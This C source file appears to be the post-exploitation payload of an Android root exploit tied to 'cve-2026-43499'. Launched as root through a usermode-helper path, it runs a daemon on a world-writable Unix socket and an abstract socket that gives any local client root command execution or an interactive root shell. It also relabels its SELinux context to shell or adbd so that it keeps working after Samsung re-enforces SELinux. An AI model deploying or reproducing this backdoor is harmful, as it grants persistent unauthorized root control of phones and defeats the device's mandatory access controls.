#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#include <poll.h>
#include <signal.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <termios.h>
#include <unistd.h>

#define SOCK_PATH "/data/local/tmp/temp_su.sock"

static void relax_daemon_context(void);

static void set_root_env(void) {
  setenv("PATH",
         "/product/bin:/apex/com.android.runtime/bin:/apex/com.android.art/bin:"
         "/apex/com.android.virt/bin:/system_ext/bin:/system/bin:/system/xbin:"
         "/odm/bin:/vendor/bin:/vendor/xbin",
         1);
  setenv("HOME", "/data/local/tmp", 1);
  setenv("USER", "root", 1);
  setenv("LOGNAME", "root", 1);
}

static void xwrite(int fd, const void *buf, size_t len) {
  const char *p = (const char *)buf;
  while (len) {
    ssize_t n = write(fd, p, len);
    if (n < 0 && errno == EINTR) {
      continue;
    }
    if (n <= 0) {
      _exit(111);
    }
    p += n;
    len -= (size_t)n;
  }
}

static int read_full(int fd, void *buf, size_t len) {
  char *p = (char *)buf;
  while (len) {
    ssize_t n = read(fd, p, len);
    if (n < 0 && errno == EINTR) {
      continue;
    }
    if (n <= 0) {
      return 0;
    }
    p += n;
    len -= (size_t)n;
  }
  return 1;
}

/* Abstract socket: no filesystem node, so no sock_file label for MAC to
 * deny.  Combined with relax_daemon_context() (shell-labeled creator),
 * shell clients can connect under Enforcing (same-domain unix_stream). */
#define SOCK_ABSTRACT_NAME "cve-2026-43499-root"

static socklen_t abstract_sockaddr(struct sockaddr_un *sun) {
  memset(sun, 0, sizeof(*sun));
  sun->sun_family = AF_UNIX;
  sun->sun_path[0] = '\0';
  size_t n = strlen(SOCK_ABSTRACT_NAME);
  if (n > sizeof(sun->sun_path) - 2)
    n = sizeof(sun->sun_path) - 2;
  memcpy(sun->sun_path + 1, SOCK_ABSTRACT_NAME, n);
  return (socklen_t)(offsetof(struct sockaddr_un, sun_path) + 1 + n);
}

static int connect_daemon(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    perror("su: socket");
    return -1;
  }

  struct sockaddr_un sun;
  socklen_t slen = abstract_sockaddr(&sun);
  if (connect(fd, (struct sockaddr *)&sun, slen) == 0) {
    return fd;
  }

  memset(&sun, 0, sizeof(sun));
  sun.sun_family = AF_UNIX;
  snprintf(sun.sun_path, sizeof(sun.sun_path), "%s", SOCK_PATH);

  if (connect(fd, (struct sockaddr *)&sun, sizeof(sun)) != 0) {
    perror("su: connect daemon");
    close(fd);
    return -1;
  }
  return fd;
}

static int pump_pair(int a, int b) {
  char buf[4096];
  int a_open = 1;
  int b_open = 1;

  while (a_open || b_open) {
    struct pollfd pfd[2];
    int nfd = 0;
    if (a_open) {
      pfd[nfd].fd = a;
      pfd[nfd].events = POLLIN;
      nfd++;
    }
    if (b_open) {
      pfd[nfd].fd = b;
      pfd[nfd].events = POLLIN;
      nfd++;
    }

    int pr = poll(pfd, (nfds_t)nfd, -1);
    if (pr < 0 && errno == EINTR) {
      continue;
    }
    if (pr < 0) {
      return 1;
    }

    int idx = 0;
    if (a_open) {
      short re = pfd[idx++].revents;
      if (re & POLLIN) {
        ssize_t n = read(a, buf, sizeof(buf));
        if (n > 0) {
          xwrite(b, buf, (size_t)n);
        } else {
          a_open = 0;
          shutdown(b, SHUT_WR);
        }
      } else if (re & (POLLHUP | POLLERR | POLLNVAL)) {
        a_open = 0;
        shutdown(b, SHUT_WR);
      }
    }
    if (b_open) {
      short re = pfd[idx++].revents;
      if (re & POLLIN) {
        ssize_t n = read(b, buf, sizeof(buf));
        if (n > 0) {
          xwrite(a, buf, (size_t)n);
        } else {
          b_open = 0;
          shutdown(a, SHUT_WR);
        }
      } else if (re & (POLLHUP | POLLERR | POLLNVAL)) {
        b_open = 0;
        shutdown(a, SHUT_WR);
      }
    }
  }
  return 0;
}

static int client_main(int argc, char **argv) {
  int fd = connect_daemon();
  if (fd < 0) {
    return 127;
  }

  if (argc >= 3 && strcmp(argv[1], "-c") == 0) {
    char mode = 'C';
    uint32_t len = (uint32_t)strlen(argv[2]);
    xwrite(fd, &mode, 1);
    xwrite(fd, &len, sizeof(len));
    xwrite(fd, argv[2], len);
    shutdown(fd, SHUT_WR);

    char buf[4096];
    for (;;) {
      ssize_t n = read(fd, buf, sizeof(buf));
      if (n < 0 && errno == EINTR) {
        continue;
      }
      if (n <= 0) {
        break;
      }
      xwrite(STDOUT_FILENO, buf, (size_t)n);
    }
    close(fd);
    return 0;
  }

  char mode = 'I';
  xwrite(fd, &mode, 1);
  int rc = pump_pair(STDIN_FILENO, fd);
  close(fd);
  return rc;
}

static void exec_command_client(int conn, const char *cmd) {
  pid_t pid = fork();
  if (pid == 0) {
    dup2(conn, STDIN_FILENO);
    dup2(conn, STDOUT_FILENO);
    dup2(conn, STDERR_FILENO);
    close(conn);
    set_root_env();
    execl("/system/bin/sh", "sh", "-c", cmd, (char *)NULL);
    _exit(127);
  }

  int status = 0;
  while (waitpid(pid, &status, 0) < 0 && errno == EINTR) {
  }
}

static int open_pty_master(char *slave, size_t slave_len) {
  int master = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (master < 0) {
    return -1;
  }
  if (grantpt(master) != 0 || unlockpt(master) != 0) {
    close(master);
    return -1;
  }
  if (ptsname_r(master, slave, slave_len) != 0) {
    close(master);
    return -1;
  }
  return master;
}

static void exec_interactive_client(int conn) {
  char slave_name[128];
  int master = open_pty_master(slave_name, sizeof(slave_name));
  if (master < 0) {
    const char msg[] = "su daemon: failed to open pty\n";
    xwrite(conn, msg, sizeof(msg) - 1);
    return;
  }

  pid_t pid = fork();
  if (pid == 0) {
    setsid();
    int slave = open(slave_name, O_RDWR | O_NOCTTY);
    if (slave < 0) {
      _exit(126);
    }
    ioctl(slave, TIOCSCTTY, 0);
    dup2(slave, STDIN_FILENO);
    dup2(slave, STDOUT_FILENO);
    dup2(slave, STDERR_FILENO);
    if (slave > STDERR_FILENO) {
      close(slave);
    }
    close(master);
    close(conn);
    set_root_env();
    execl("/system/bin/sh", "sh", "-i", (char *)NULL);
    _exit(127);
  }

  pump_pair(conn, master);
  kill(pid, SIGHUP);
  int status = 0;
  while (waitpid(pid, &status, 0) < 0 && errno == EINTR) {
  }
  close(master);
}

static void serve_one(int conn) {
  char mode = 0;
  if (!read_full(conn, &mode, 1)) {
    return;
  }

  if (mode == 'C') {
    uint32_t len = 0;
    if (!read_full(conn, &len, sizeof(len)) || len > 65536) {
      return;
    }
    char *cmd = calloc(1, (size_t)len + 1);
    if (!cmd) {
      return;
    }
    if (!read_full(conn, cmd, len)) {
      free(cmd);
      return;
    }
    exec_command_client(conn, cmd);
    free(cmd);
  } else if (mode == 'I') {
    exec_interactive_client(conn);
  }
}

static void relax_daemon_context(void) {
  /* Samsung re-arms SELinux within minutes and shell clients can no longer
   * connect to a kernel-labeled socket.  Switching the daemon to a shell
   * label BEFORE bind() makes the socket connectable under Enforcing while
   * uid/caps stay root.  Real UID/GID transitions from this context are
   * fatal (credential watcher), but setcon only changes the MAC label.
   * Best-effort: failure falls back to the old behavior. */
  static const char *cands[] = {"u:r:shell:s0", "u:r:adbd:s0", NULL};
  char cur[96];
  int fd = open("/proc/self/attr/current", O_RDWR | O_CLOEXEC);
  if (fd < 0)
    return;
  for (int i = 0; cands[i]; i++) {
    size_t len = strlen(cands[i]);
    if (write(fd, cands[i], len) != (ssize_t)len)
      continue;
    if (lseek(fd, 0, SEEK_SET) < 0)
      break;
    ssize_t n = read(fd, cur, sizeof(cur) - 1);
    if (n > 0) {
      cur[n] = 0;
      int log = open("/data/local/tmp/daemon-ctx.log",
                     O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
      if (log >= 0) {
        dprintf(log, "daemon context: %s\n", cur);
        close(log);
      }
    }
    break;
  }
  close(fd);
}

static int daemon_main(void) {
  signal(SIGPIPE, SIG_IGN);
  set_root_env();
  relax_daemon_context();

  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    perror("socket");
    return 1;
  }

  unlink(SOCK_PATH);
  struct sockaddr_un sun;
  memset(&sun, 0, sizeof(sun));
  sun.sun_family = AF_UNIX;
  snprintf(sun.sun_path, sizeof(sun.sun_path), "%s", SOCK_PATH);

  if (bind(fd, (struct sockaddr *)&sun, sizeof(sun)) != 0) {
    perror("bind");
    return 1;
  }
  chmod(SOCK_PATH, 0666);
  if (listen(fd, 16) != 0) {
    perror("listen");
    return 1;
  }

  /* Abstract listener: same accept loop serves both.  -1 if unavailable. */
  int afd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (afd >= 0) {
    struct sockaddr_un asun;
    socklen_t aslen = abstract_sockaddr(&asun);
    if (bind(afd, (struct sockaddr *)&asun, aslen) != 0 || listen(afd, 16) != 0) {
      close(afd);
      afd = -1;
    }
  }

  for (;;) {
    int conn = -1;
    if (afd < 0) {
      conn = accept4(fd, NULL, NULL, SOCK_CLOEXEC);
      if (conn < 0 && errno == EINTR) {
        continue;
      }
      if (conn < 0) {
        perror("accept");
        sleep(1);
        continue;
      }
    } else {
      struct pollfd pfds[2];
      pfds[0].fd = fd;
      pfds[0].events = POLLIN;
      pfds[1].fd = afd;
      pfds[1].events = POLLIN;
      int pr = poll(pfds, 2, -1);
      if (pr < 0 && errno == EINTR) {
        continue;
      }
      if (pr < 0) {
        perror("poll");
        sleep(1);
        continue;
      }
      int lfd = (pfds[0].revents & POLLIN) ? fd : afd;
      conn = accept4(lfd, NULL, NULL, SOCK_CLOEXEC);
      if (conn < 0 && errno == EINTR) {
        continue;
      }
      if (conn < 0) {
        perror("accept");
        sleep(1);
        continue;
      }
    }

    pid_t pid = fork();
    if (pid == 0) {
      close(fd);
      serve_one(conn);
      close(conn);
      _exit(0);
    }
    close(conn);
    while (waitpid(-1, NULL, WNOHANG) > 0) {
    }
  }
}

static int umh_main(void) {
  if (geteuid() != 0) {
    return 126;
  }
  if (setresgid(0, 0, 0) != 0 || setresuid(0, 0, 0) != 0 ||
      getuid() != 0 || geteuid() != 0 || getgid() != 0 || getegid() != 0) {
    return 125;
  }

  return daemon_main();
}

int main(int argc, char **argv) {
  if (argc >= 2 && strcmp(argv[1], "--daemon") == 0) {
    return daemon_main();
  }
  if (argc >= 2 && strcmp(argv[1], "--umh") == 0) {
    return umh_main();
  }
  return client_main(argc, argv);
}
